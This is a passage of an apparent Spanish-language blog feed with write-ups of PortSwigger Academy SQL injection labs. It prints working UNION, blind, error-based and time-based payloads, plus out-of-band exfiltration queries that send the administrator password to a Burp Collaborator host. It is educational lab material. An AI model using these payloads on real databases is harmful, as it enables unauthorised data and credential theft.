sql injection a ciegas no puede llegar.\nReconocimiento Burpsuite cuenta con una propia herramienta que es Burp Collaborator que lo que hace es apoyar a detectar vulnerabilidades a ciegas. Pero si no se cuenta con Burpsuite Pro no se puede utilizar, asi que se listan a continuacion algunas alternativas para poder explotar esta vulnerabilidad.\n En el laboratorio no se puede realizar alguna de estas alternativas ya que el firewall de PortswiggerAcademy bloquea\n  http://dnslog.cn/ https://webhook.site/ https://app.interactsh.com/ http://pingb.in/ http://swin.es/ http://ceye.io/ https://canarytokens.org/ https://requestbin.net/ https://beeceptor.com/  Payloads Los payloads a inyectar segun la base de datos son los siguientes:\n   Backend Consulta     Oracle SELECT extractvalue(xmltype('\\\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot;?\u0026gt;\\\u0026lt;!DOCTYPE root [ \\\u0026lt;!ENTITY % remote SYSTEM \u0026quot;http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/\u0026quot;\u0026gt; %remote;]\u0026gt;'),'/l') FROM dual o SELECT UTL_INADDR.get_host_address('YOUR-SUBDOMAIN-HERE.burpcollaborator.net') solo con privilegios elevados   Microsoft exec master..xp_dirtree '//YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a'   PostgreSQL copy (SELECT '') to program 'nslookup YOUR-SUBDOMAIN-HERE.burpcollaborator.net'   MySQL LOAD_FILE('\\\\\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\\\a') solo trabaja en windows o SELECT ... INTO OUTFILE '\\\\\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a'    Explotar Utilizando una de las consultas podemos inyectar una consulta y enviar la consulta, y ahora collaborate nos enviara las peticiones que se han realizado.\nxxxxxxxxxxxxxxxx\u0026#39;+UNION+SELECT+EXTRACTVALUE(xmltype(\u0026#39;\u0026lt;%3fxml+version%3d\u0026#34;1.0\u0026#34;+encoding%3d\u0026#34;UTF-8\u0026#34;%3f\u0026gt;\u0026lt;!DOCTYPE+root+[+\u0026lt;!ENTITY+%25+remote+SYSTEM+\u0026#34;http%3a//gcwtmppkxyte3s4zwxzqbfkig9mba0.burpcollaborator.net/\u0026#34;\u0026gt;+%25remote%3b]\u0026gt;\u0026#39;),\u0026#39;/l\u0026#39;)+FROM+dual--  Envio de consulta con repeater \nY con esto hemos resulto el lab:\n Laboratorio resuelto \nCon esto ya muestra que se ha resuelto el lab.\n  Laboratorio\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n   ","date":"2021-11-11T00:00:00Z","image":"https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-15/head_huc76dcbe4719eea5620ad72b9e0798e52_74880_120x120_fill_box_smart1_3.png","permalink":"https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-15/","title":"Portswigger Academy Learning Path: SQL Injection Lab 15"},{"content":"Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft En este laboratorio1la finalidad es poder extraer la contrasena del usuario \u0026lsquo;administrator\u0026rsquo; en la tabla \u0026lsquo;users\u0026rsquo;. Para este caso haciendo uso de la exfiltracion de la propia base de datos para que se conecte a nuestro host y ahi captura lo que es enviado en la url.\nReconocimiento Lo primero es saber que tipo de payloads podemos usar para ejecutar la consulta que deseamos, y se encuentran las siguientes:\n    Backend Consulta     Oracle SELECT extractvalue(xmltype('\u0026lt;?xml version=\u0026ldquo;1.0\u0026rdquo; encoding=\u0026ldquo;UTF-8\u0026rdquo;?\u0026gt;\u0026lt;!DOCTYPE root [ \u0026lt;!ENTITY % remote SYSTEM \u0026ldquo;http://'||(SELECT YOUR-QUERY-HERE)||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/\u0026quot;\u0026gt; %remote;]\u0026gt;'),'/l') FROM dual   Microsoft declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec(\u0026lsquo;master..xp_dirtree \u0026ldquo;//'+@p+'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a\u0026rdquo;')   PostgreSQL create OR replace function f() returns void as $$ declare c text; declare p text; begin SELECT into (SELECT YOUR-QUERY-HERE); c := \u0026lsquo;copy (SELECT \u0026lsquo;''') to program \u0026lsquo;\u0026lsquo;nslookup \u0026lsquo;||p||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net\u0026rsquo;'';execute c; END; $$ language plpgsql security definer; SELECT f();   MySQL SELECT YOUR-QUERY-HERE INTO OUTFILE \u0026lsquo;\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a\u0026rsquo; solo funciona en windows    Payloads Ahora toca saber cual es el payload correcto para poder resolver el lab, probando de uno en uno llegamos a cual es el correcto, asi que probaremos con Oracle el cual termino siendo el correcto y evitarnos probar cada uno del resto, la consulta ejecutada fue:\nxxxxxxxxxxxx\u0026#39; UNION SELECT extractvalue(xmltype(\u0026#39;\u0026lt;?xmlversion=\u0026#34;1.0\u0026#34;encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt;\u0026lt;!DOCTYPEroot[\u0026lt;!ENTITY%remoteSYSTEM\u0026#34;http://\u0026#39;||(SELECT password from users where username=\u0026#39;administrator\u0026#39;)||\u0026#39;.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/\u0026#34;\u0026gt;%remote;]\u0026gt;\u0026#39;),\u0026#39;/l\u0026#39;) FROM dual-- Claramente este codigo debemos convertirlo en formato URL para que no entre en conflicto con el header que es enviado. Para quedarmente enviado y ejecutado de esta manera.\n Peticion enviada con repeater para exfiltrar la contrasena \nAhora solo queda iniciar sesion con la contrasena de administrator qu es 54m0mxu0yem302cyqm60.Y con esto hemos resulto el lab:\n Laboratorio resuelto \nCon esto ya muestra que se ha resuelto el lab.\n  Laboratorio\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n   ","date":"2021-11-11T00:00:00Z","image":"https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-16/head_huc76dcbe4719eea5620ad72b9e0798e52_74880_120x120_fill_box_smart1_3.png","permalink":"https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-16/","title":"Portswigger Academy Learning Path: SQL Injection Lab 16"},{"content":"Lab: Blind SQL injection with time delays En este laboratorio1la finalidad es poder explotar una vulnerabilidad de sql injection pero basandose en tiempo, en este caso la inyeccion solo es para poder inyectar un codigo que genere un delay hacia el backend de la base de datos, lo cual la respuesta tardara segun el tiempo que nosotros le inyectemos. En base a ese tiempo despues podriamos generar una consulta if para poder devolvernos si la consulta hecha es true o false.\nReconocimiento Se pide que solo se inyecte una consulta sql que cause un delay de 10 segundos asi que buscaremos la vulnerabilidad en la aplicacion y para generar un delay con cada backend seria un ejemplo:\nOracle\ndbms_pipe.receive_message(('a'),10)\nMicrosoft\nWAITFOR DELAY '0:0:10'\nPostgreSQL\nSELECT pg_sleep(10)\nMySQL\nSELECT sleep(10)\nPayloads En este caso he conocido otra lista2donde reune todos los payloads que se pueden inyectar para generar una vulnerabilidad sql. Al hacer tantas combinaciones, se pudo generar una o varias la cual permiten que se genere un delay en la aplicacion. Todo esto podemos verlo gracias a uno de los probados son:\nxxxxxxxxx\u0026#39; AND 1337=(SELECT 1337 FROM PG_SLEEP(5)) AND \u0026#39;1337\u0026#39;=\u0026#39;1337Lo primero a agregar es que se debe de activar la columna response received para ver el tiempo que la respuesta a tardado en ser recibida, lo que nos indica que se inyecto una consult sql.\n Ataque de sql injection time based con intruder \nAhora la enviaremos por repeater con un sleep de 10 segundos y ver si tarda 10 segundos en responder y si vemos de lado derecho la peticion dura 10,486 millis en responder.\n Envio de peticion por repeater \nY con esto hemos resulto el lab:\n Laboratorio resuelto \nCon esto ya muestra que se ha resuelto el lab.\n  Laboratorio\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n Lista de Payloads SQL Injection Time Based\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n   ","date":"2021-11-08T00:00:00Z","image":"https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-13/head_huc76dcbe4719eea5620ad72b9e0798e52_74880_120x120_fill_box_smart1_3.png","permalink":"https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-13/","title":"Portswigger Academy Learning Path: SQL Injection Lab 13"},{"content":"Lab: SQL injection attack, listing the database contents on Oracle En este laboratorio1la finalidad es poder extraer los datos en una base de datos oracle que es muy distinto a como se hace en los otros gestores\nReconocimiento Algo a notar en las consultas al hacer union en MySQL es que al agregar un comentario se debe de agregar un espacio, como ejemplo union select null--  notese el espacio al final para que el sistema pueda comentar correctamente, en otros gestores no es necesario esto pero MySQL si.\n Algo a tomar en cuenta es que al hacer la solicitud por medio del navegador si se agrega solamente un espacio este no aceptara correctamente la consulta por alguna razon por lo que habria que agregar un - para inyectar correctamente la consulta y contrario por medio de repeater en burpsuite si se puede agregar solo el espacio y sigue mostrando correctamente sin dar un error de servidor.\n Payloads Detectar columnas Pets\u0026#39; order by 1-- - Pets\u0026#39;orderby2-- - Pets\u0026#39; order by 3-- - //Muestra error Detectar string Por lo que se ve al imprimir datos es que las dos columnas recuperan datos string, no es necesario hacer la prueba pero siempre hacerlo cuando se dude.\nPets\u0026#39; union select \u0026#39;test\u0026#39;,\u0026#39;test\u0026#39; from dual-- - Recuperar tablas Ahora recuperar las tablas, en este caso vamos a buscar una tabla que contenga los usuarios, en este caso es la tabla USERS_TMNLZU y es la que se lista.\nPets\u0026#39; union select table_name,null from all_tables-- -  Tablas \nRecuperar columnas Para detectar el nombre de las columnas en las tablas se inyecta la siguiente consulta, indicando la tabla de la que se quiere extraer.\nPets\u0026#39; union select column_name,null from all_tab_columns where table_name = \u0026#39;USERS_TMNLZU\u0026#39;-- -  Columnas de tabla USERS_TMNLZU \nExtraer datos Ahora podremos recuperar los datos teniendo el nombre de las columnas y el nombre de las tablas.\nPets\u0026#39; union select USERNAME_KNMULR,PASSWORD_KQXSZA from USERS_TMNLZU-- -  Datos extraidos de la tabla USERS_TMNLZU \nY con esto hemos resulto el lab:\n Laboratorio resuelto \nCon esto ya muestra que se ha resuelto el lab.\n  Laboratorio\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n   ","date":"2021-11-07T00:00:00Z","image":"https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/head_huc76dcbe4719eea5620ad72b9e0798e52_74880_120x120_fill_box_smart1_3.png","permalink":"https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-10/","title":"Portswigger Academy Learning Path: SQL Injection Lab 10"},{"content":"Lab: Blind SQL injection with conditional responses En este laboratorio1la finalidad es poder extraer la contrasena del usuario administrator, para eso se nos dan las columnas username y password de la tabla users.\nReconocimiento Lo primero es buscar donde es vulnerable a sql injection, en este caso nos dicen en el articulo que seguramente es la cookie de TrackingId solo queda comprobarlo.\nPayloads Detectar si es vulnerable TrackingId=xxxxxxxxxxxxxxxx' and '1'='1; //Muestra welcome back TrackingId=xxxxxxxxxxxxxxxx' and '1'='2; //No muestra welcome back  Peticion enviada al servidor \nAl inyectar la solicitud podemos darnos cuenta que el sistema valida la cookie dependiendo de la respuesta de mysql, si hacemos una comparacion que no es correcta, el sistema ya no imprime welcome back.\nVerificar tamano de la contrasena de administrator Ahora toca construir una consulta para inyectar para poder extraer los datos de base de datos de users\nTrackingId=xxxxxxxxxxxxxxxx\u0026#39; and (select length(password) from users where username=\u0026#39;administrator\u0026#39;)=1-- La siguiente solicitud lo que hace es hacer un select del tamano de la contrasena del usuario administrator y el valor numerico es el que ira cambiando, y hasta que el sistema devuelva la respuesta welcome back es porque es lo correcto, todo basandose en que la respuesta sea true si imprimira ese resultado.\nEn este caso construimos la siguiente captura para saber el valor del tamano de la contrasena para posteriormente ir cambiando el valor de la consulta y hacer un ataque con intruder en burpsuite para evitar hacerlo a mano y durar mucho en el proceso. Para eso crafteamos la siguiente solicitud, y agregamos como payload el valor numerico para ir cambiandolo y averiguar el tamano de la contrasena administrador.\n Solicitud que se enviara \nLuego agregaremos el payload para que acepte numeros e ir probando uno por uno para posteriormente analizar el resultado. El\n Payloads con valores numericos \nY finalmente haremos un grep en la respuesta ya que si recibimos la palabra welcome back es porque ese es el tamano de la contrasena. Si\n Grep de la respuesta recibida \nY ejecutando el ataque podemos ver que la contrasena tiene un tamano de 20.\n Ataque realizado \nTomar los datos del usuario administrator Sabiendo ya el tamano ya podemos proceder a tomar la contrasena del usuario administrator, para eso inyectaremos la siguiente solicitud:\nTrackingId=xxxxxxxxxxxxxxxx\u0026#39; and (select substr(password,1,1) from users where username=\u0026#39;administrator\u0026#39;)=\u0026#39;A\u0026#39;--  SUBSTR: Son 3 valores los que espera que serian\n Variable: Puede ser nombre de tabla, string, nombre de columna Segundo valor: A este se le indica desde donde quiere que se empiece a tomar en cuenta, este es el que ira cambiando Tercero: Cuantos valores quiere que se imprima, en este caso solo queremos 1   Para el uso de texto enviaremos peticiones con valores del abecedario y valores numericos, para eso es mejor utilizar la siguiente lista de caracteres alfanumericos2Y ahora vamos a intruder y configuramos de la siguiente manera, de forma de cluster bomb para enviar 2 parametros y que pruebe todas las combinaciones.\n NOTA: En las capturas se muestra el valor alfanumerico sin comillas simples, por lo cual se debe de colocar\n  Configuracion de posicion \nAhora a configurar los payloads tanto del valor 1 como del 2:\n Configuracion de payload 1   Configuracion de payload 2 \nY en este caso ya hemos obtenido los resultados, solamente queda unirlos para entrar como el usuario administrator que quedaria con el password inpxkyrid4icz30lq1v8:\n Ataque con cluster bomb \nY con esto hemos resulto el lab:\n Laboratorio resuelto \nCon esto ya muestra que se ha resuelto el lab.\n  Laboratorio\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n Caracteres alfanumericos\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n   ","date":"2021-11-07T00:00:00Z","image":"https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/head_huc76dcbe4719eea5620ad72b9e0798e52_74880_120x120_fill_box_smart1_3.png","permalink":"https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-11/","title":"Portswigger Academy Learning Path: SQL Injection Lab 11"},{"content":"# Lab: Blind SQL injection with conditional errors En este laboratorio1la finalidad es poder extraer la contrasena de la tabla users del usuario administrator. Ademas se indica que esta utilizando en el backend Oracle por lo cual procederemos a buscar la informacion sobre este.\nReconocimiento Al abrir la aplicacion vemos que ya no se comporta como en el Lab11 lo que nos permitia que segun la respuesta devuelta por el servidor saber si la consulta que realizabamos era true o false.\nAhora lo que se puede hacer es inyectar una consulta SQL que nos genere ese error a proposito para saber si la consulta es true o false y el error terminara dando un error en el servidor y nos guiaremos por eso. Y ya que sabemos que es un backend Oracle haremos la siguiente prueba a inyectar en la cookie\nEn este caso inyectaremos la siguiente peticion:\nxxxxx\u0026#39; AND (SELECT CASE WHEN (1=2) THEN to_char(1/0) ELSE \u0026#39;a\u0026#39; END FROM dual)=\u0026#39;a//muestralapaginanormalxxxxx\u0026#39; AND (SELECT CASE WHEN (1=1) THEN to_char(1/0) ELSE \u0026#39;a\u0026#39; END FROM dual)=\u0026#39;a//muestraunerrordeservidorLo que hace practicamente es que se cumpla la condicion de la cookie y luego la dentro del select genera un propio error que nos dira si es true o false segun la condicion que queramos, en este caso de prueba se valida con 1=1 o 1=2 aqui genera error del servidor solo si se cumple como pasa con la condicion 1=1, practicamente es un codigo que en cualquier lenguaje de programacion se ve, por ultimo si la condicion no es correcta como la salida sera 'a' solo valida que sea igual a la ultima a ingresada 'a con una sola comilla al inicio para que la ultima la agregue el propio sistema a la que le colocaria a la cookie.\nPayloads Recuperar tamano de contrasena Como en el laboratorio anterior tocara saber el tamano de la contrasena y para eso utilizaremos la siguiente consulta inyectada:\nxxxxx\u0026#39; AND (SELECT CASE WHEN ((select length(password) from users where username=\u0026#39;administrator\u0026#39;)=20) THEN to_char(1/0) ELSE \u0026#39;a\u0026#39; END FROM dual)=\u0026#39;aEsta inyeccion hace validar el tamano de la contrasena, si la contrasena tiene el tamano que se le indica hara que la aplicacion genere un error 500 en el servidor de Internal Server Error.\n Payload a enviar el ataque por intruder \nAl valor se le hara una peticion de 1 hasta 30 para saber cual es el tamano de la contrasena y como se muestra la aplicacion genera un error 500 con el payload 20 lo que significa que la contrasena tiene 20 caracteres.\n Ataque con intruder \nRecuperar la contrasena Ahora que sabemos el tamano ya podemos enviar la peticion para recuperarla, ahora para recuperar la contrasena utilizaremos la siguiente consulta para inyectar:\nxxxxx\u0026#39; AND (SELECT CASE WHEN ((select SUBSTR(password, 1, 1) from users where username=\u0026#39;administrator\u0026#39;)=\u0026#39;a\u0026#39;) THEN to_char(1/0) ELSE \u0026#39;a\u0026#39; END FROM dual)=\u0026#39;aAhora vamos a realizar un ataque de clusterbomb enviando en el primer parametro el valor que cambiara de 1 a 20 y en el segundo un caracter alfanumerico.\n Ataque de cluster bomb \nY al terminar el ataque podemos notar que los que dan un error 500 del lado servidor son donde la condicion fue true y toca tomar toda esa informacion para formar la contrasena:\n Resoyestas del ataque con error de respuesta 500 \nAl finalizar y formar la contrasena seria gt4dyzmn4weyzcdog1n1 y podemos iniciar sesion en la aplicacion para completar el laboratorio\nY con esto hemos resulto el lab:\n Laboratorio resuelto \nCon esto ya muestra que se ha resuelto el lab.\n  Laboratorio\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n   ","date":"2021-11-06T00:00:00Z","image":"https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-12/head_huc76dcbe4719eea5620ad72b9e0798e52_74880_120x120_fill_box_smart1_3.png","permalink":"https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-12/","title":"Portswigger Academy Learning Path: SQL Injection Lab 12"},{"content":"Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft En este laboratorio1la finalidad es poder extraer la version de la base de datos MySQL o Microsoft SQL Server y poder imprimir en las tablas que se presentan. La string que deberiamos de recuperar es 8.0.27\nReconocimiento Algo a notar en las consultas al hacer union en MySQL es que al agregar un comentario se debe de agregar un espacio, como ejemplo union select null--  notese el espacio al final para que el sistema pueda comentar correctamente, en otros gestores no es necesario esto pero MySQL si.\n Algo a tomar en cuenta es que al hacer la solicitud por medio del navegador si se agrega solamente un espacio este no aceptara correctamente la consulta por alguna razon por lo que habria que agregar un - para inyectar correctamente la consulta y contrario por medio de repeater en burpsuite si se puede agregar solo el espacio y sigue mostrando correctamente sin dar un error de servidor.\n Payloads Detectar columnas Gifts\u0026#39; order by 1-- - Gifts\u0026#39;orderby2-- - Gifts\u0026#39; order by 3-- - //Muestra error Detectar string Por lo que se ve al imprimir datos es que las dos columnas recuperan datos string, no es necesario hacer la prueba pero siempre hacerlo cuando se dude.\nGifts\u0026#39; union select \u0026#39;test\u0026#39;,\u0026#39;test\u0026#39;-- - Recuperar version Ahora recuperar la version, las consultas utilizadas para esto en Oracle son las siguientes:\nGifts\u0026#39; union select @@version,null-- - Y con esto hemos resulto el lab:\n Laboratorio resuelto \nCon esto ya muestra que se ha resuelto el lab.\n  Laboratorio\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n   ","date":"2021-11-06T00:00:00Z","image":"https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-8/head_huc76dcbe4719eea5620ad72b9e0798e52_74880_120x120_fill_box_smart1_3.png","permalink":"https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-8/","title":"Portswigger Academy Learning Path: SQL Injection Lab 8"},{"content":"Lab: SQL injection attack, listing the database contents on non-Oracle databases En este laboratorio1la finalidad es poder extraer datos de la base de datos, basandose en inyectar consultas para tomarlos, al final se resuelve el laboratorio iniciando sesion con el usuario administrator.\nReconocimiento Algo a notar en las consultas al hacer union en MySQL es que al agregar un comentario se debe de agregar un espacio, como ejemplo union select null--  notese el espacio al final para que el sistema pueda comentar correctamente, en otros gestores no es necesario esto pero MySQL si.\nPayloads Detectar columnas Gifts\u0026#39; order by 1-- - Gifts\u0026#39;orderby2-- - Gifts\u0026#39; order by 3-- - //Muestra error Detectar string Por lo que se ve al imprimir datos es que las dos columnas recuperan datos string, no es necesario hacer la prueba pero siempre hacerlo cuando se dude.\nGifts\u0026#39; union select \u0026#39;test\u0026#39;,\u0026#39;test\u0026#39;-- - Recuperar tablas Gifts\u0026#39; union select null,table_name fRoM information_schema.tables-- -  Listado de Tablas \nRecuperar nombres de columnas de la tabla users_fcqnpf Gifts\u0026#39; union select null,column_name fRoM information_schema.columns wHeRe table_name=\u0026#39;users_fcqnpf\u0026#39;-- -  Listado de columnas de la tabla users_fcqnpf \nRecuperar Datos Gifts\u0026#39; union select username_nrukiy,password_ebqikr from users_fcqnpf-- -  Usuarios y Contrasenas extraidos \nY con esto hemos resulto el lab:\n Laboratorio resuelto \nCon esto ya muestra que se ha resuelto el lab.\n  Laboratorio\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n   ","date":"2021-11-06T00:00:00Z","image":"https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/head_huc76dcbe4719eea5620ad72b9e0798e52_74880_120x120_fill_box_smart1_3.png","permalink":"https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-9/","title":"Portswigger Academy Learning Path: SQL Injection Lab 9"},{"content":"Lab: SQL injection UNION attack, determining the number of columns returned by the query En este laboratorio1la finalidad es recuperar el numero de columnas de la tabla a la que se esta realizando la consulta, para posteriormente poder extraer los datos basandose en ese numero de columnas. Para este caso se puede hacer uso de dos metodos que pueden ser ORDER BY ? o UNION SELECT NULL,NULL,NULL...\nUsando algunos de estos dos podemos recuperar el numero de columnas, sabiendo que a la hora que la aplicacion genere un error no sera el numero de columna correcta, claramente si usamos un order by 9 y secuencialmente llegamos hasta el 10 quiere decir que esa tabla cuenta con 9 columnas y son las que utilizaremos posteriormente para imprimir los datos.\nUnion select null funciona igualmente, si agregamos 9 null y al agregar un null mas nos muestra error quiere decir que esa tabla solo cuenta con 9 columnas. Un ejemplo de uso en una consulta sql seria:\nselect*fromtablawherenombre=\u0026#39;test\u0026#39;orderby1-- select*fromtablawherenombre=\u0026#39;test\u0026#39;orderby2-- select*fromtablawherenombre=\u0026#39;test\u0026#39;orderby3-- select*fromtablawherenombre=\u0026#39;test\u0026#39;orderbyn-- select*fromtablawherenombre=\u0026#39;test\u0026#39;unionselectnull-- select*fromtablawherenombre=\u0026#39;test\u0026#39;unionselectnull,null-- select*fromtablawherenombre=\u0026#39;test\u0026#39;unionselectnull,null,null-- select*fromtablawherenombre=\u0026#39;test\u0026#39;unionselectnull,null,null,null-- Reconocimiento Ingresamos a la web y elegimos alguna categoria, en este ejemplo sera la categoria Pets.Ahora es momento de ir probando secuencialmente numero en numero y ver hasta que valor nos dara el error:\nPayloads    Payload Resultado     Pets' order by 1\u0026ndash; Imprime resultados normalmente   Pets' order by 2\u0026ndash; Imprime resultados normalmente   Pets' order by 3\u0026ndash; Imprime resultados normalmente   Pets' order by 4\u0026ndash; Muestra error   Pets' UNION SELECT NULL\u0026ndash; Muestra error   Pets' UNION SELECT NULL,NULL\u0026ndash; Muestra error   Pets' UNION SELECT NULL,NULL,NULL\u0026ndash; Imprimer resultados normalmente   Pets' UNION SELECT NULL,NULL,NULL,NULL\u0026ndash; Muestra error    Como se ve al ingresar el valor 4 o 1,2 y 4 nulls, nos muestra un error de Internal server error lo que hace que el backend no este respondiendo de manera correcta y no pueda procesar la solicitud. Con esto sabemos que la tabla en la que se extrae los datos cuenta con 3 columnas.\n Laboratorio resuelto \n  Laboratorio\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n   ","date":"2021-11-04T00:00:00Z","image":"https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-3/head_huc76dcbe4719eea5620ad72b9e0798e52_74880_120x120_fill_box_smart1_3.png","permalink":"https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-3/","title":"Portswigger Academy Learning Path: SQL Injection Lab 3"},{"content":"Lab: SQL injection UNION attack, finding a column containing text En este laboratorio1la finalidad es saber el tipo de datos que es utilizado en los valores que son enviadas en la consulta, ya que es necesario saber que tipo de valor son para que el sistema no genere errores al momento de extraeros, utilizaremos la informacion anterior primero enumerando el numero de columnas, y al hacer el reconocimiento sabemos que cuenta con 3 columnas ya que es la unica que no genera un error.\nPets\u0026#39; UNION SELECT NULL,NULL,NULL-- Reconocimiento Ingresamos a la web y al acceder en mi caso me pide que imprima el valor mO7mSy al recuperar los datos, asi que buscaremos que valores aceptan string para poder imprimirlo\nPayloads    Payload Resultado     Pets' UNION SELECT \u0026lsquo;test\u0026rsquo;,NULL,NULL\u0026ndash; Muestra error   Pets' UNION SELECT NULL,\u0026lsquo;test\u0026rsquo;,NULL\u0026ndash; Imprime resultados normalmente   Pets' UNION SELECT NULL,NULL,\u0026lsquo;test\u0026rsquo;\u0026ndash; Muestra error    Nos podemos dar cuenta que la columna dos permite que se puedan ingresar datos de tipo string ahora toca ingresar la cadena que nos indican para poder resolver el lab, inyectando la consulta sql:\nPets\u0026#39; UNION SELECT NULL,\u0026#39;mO7mSy\u0026#39;,NULL--  Laboratorio resuelto \n  Laboratorio\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n   ","date":"2021-11-04T00:00:00Z","image":"https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-4/head_huc76dcbe4719eea5620ad72b9e0798e52_74880_120x120_fill_box_smart1_3.png","permalink":"https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-4/","title":"Portswigger Academy Learning Path: SQL Injection Lab 4"},{"content":"Lab: Lab: SQL injection UNION attack, retrieving data from other tables En este laboratorio1la finalidad es poder extraer los datos de una tabla, las columnas son username y password de la tabla users. La idea es hacer uso del metodo union en sql para poder extraer esos datos aparte de los que ya trae el sistema. La consulta comun para recuperar estos datos seria:\nselectusername,passwordfromusers;Reconocimiento Ahora toca usar el metodo union para poder recuperar esos datos y tratar de inyectar ese comando en la consulta primaria para recuperar los usuarios y contrasenas de la tala de usuarios.\nPayloads Recuperar columnas Recuperamos las columnas inyectando la siguiente consulta:\nhttps://xxxxxxxxxxxx.web-security-academy.net/filter?category=Pets' order by 4-- Recuperar tipo de datos Ahora queremos saber que tipos de datos acceptan, inyectando algunas string en los dos vemos que no hay problema al hacerlo.\nPets\u0026#39; union select \u0026#39;test\u0026#39;,\u0026#39;test\u0026#39;--  Tipo de Datos aceptados \nRecuperar datos de usuarios Ahra ya podemos tomar los datos de la tabla de usuarios que se nos pide, para eso inyectaremos la siguiente consulta:\nPets\u0026#39; union select username,password from users--  Usuarios y Contrasenas de la tabla users \nAhora que ya nos hicimos con los datos del administrador, podemos iniciar sesion para que el sistema ya nos tome como resuelto el lab.\n Laboratorio resuelto \n  Laboratorio\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n   ","date":"2021-11-04T00:00:00Z","image":"https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-5/head_huc76dcbe4719eea5620ad72b9e0798e52_74880_120x120_fill_box_smart1_3.png","permalink":"https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-5/","title":"Portswigger Academy Learning Path: SQL Injection Lab 5"},{"content":"Lab: SQL injection UNION attack, retrieving multiple values in a single column En este laboratorio1la finalidad es poder extraer los datos de una tabla, las columnas son username y password de la tabla users. Es igual al anterior lab solamente que esta vez se tiene que extraer los datos en una sola columna haciendo uso de una consulta sql. La forma que tiene SQL para poder extraer datos de esa manera es de la siguiente:\n   DBMS Concatenacion     Oracle \u0026lsquo;foo\u0026rsquo;||\u0026lsquo;bar\u0026rsquo;   Microsoft \u0026lsquo;foo\u0026rsquo;+\u0026lsquo;bar\u0026rsquo;   Postgresql \u0026lsquo;foo\u0026rsquo;||\u0026lsquo;bar\u0026rsquo;   MySQL \u0026lsquo;foo\u0026rsquo; \u0026lsquo;bar\u0026rsquo;    Reconocimiento Ahora toca usar el metodo union para poder recuperar esos datos y tratar de inyectar ese comando en la consulta primaria para recuperar los usuarios y contrasenas de la tala de usuarios.\nPayloads Estos pasos se repetiran los mismos del laboratorio anterior Lab5.\nRecuperar columnas Recuperamos las columnas inyectando la siguiente consulta:\nhttps://xxxxxxxxxxxx.web-security-academy.net/filter?category=Pets' order by 1-- https://xxxxxxxxxxxx.web-security-academy.net/filter?category=Pets' order by 2-- https://xxxxxxxxxxxx.web-security-academy.net/filter?category=Pets' order by 3-- Al ver que en 2 muestra bien y en 3 da un error interno, sabemos que cuenta con 2 columnas.\nRecuperar tipo de datos Ahora queremos saber que tipos de datos acceptan, inyectando algunas string en los dos vemos que no hay problema al hacerlo.\nPets\u0026#39; union select \u0026#39;test\u0026#39;,\u0026#39;test\u0026#39;-- Pets\u0026#39;unionselect\u0026#39;test\u0026#39;,null-- Pets\u0026#39; union select null,\u0026#39;test\u0026#39;-- Ahora sabemos que solo podemos inyectar texto en el una columna que seria la segunda.\nRecuperar datos de usuarios Ahra ya podemos tomar los datos de la tabla de usuarios que se nos pide, para eso inyectaremos las siguientes consultas:\nPets\u0026#39; union select null,username from users-- Pets\u0026#39;unionselectnull,passwordfromusers--  Contrasenas de la tabla users \nPero haciendo dos consultas es muy complicado recuperar todos estos datos y luego unirlos y saber que valor es de cada uno. Para eso podemos usar la concatenacion que es propia del sistema, solo es de saber que sistema se esta usando en el backend realizando pruebas, probaremos con todos y ver si nos arroja un resultado. La consultaria quedaria asi:\nPets\u0026#39; union select null,username password from users-- Pets\u0026#39;unionselectnull,username||passwordfromusers-- Pets\u0026#39; union select null,username+password from users-- Ahora con alguno de los payloads ingresados pudimos recuperar los datos en una misma columna como se puede ver y ya contamos con el usuario y las credenciales, ya solo queda ingresar al sistema y resuelto.\n Laboratorio resuelto \nAlgo para finalizar que se podria hacer es agregar un guion para saber cuando termina una columna de la otra, esto se arregla agregando cualquier caracter en el medio, por ejemplo un 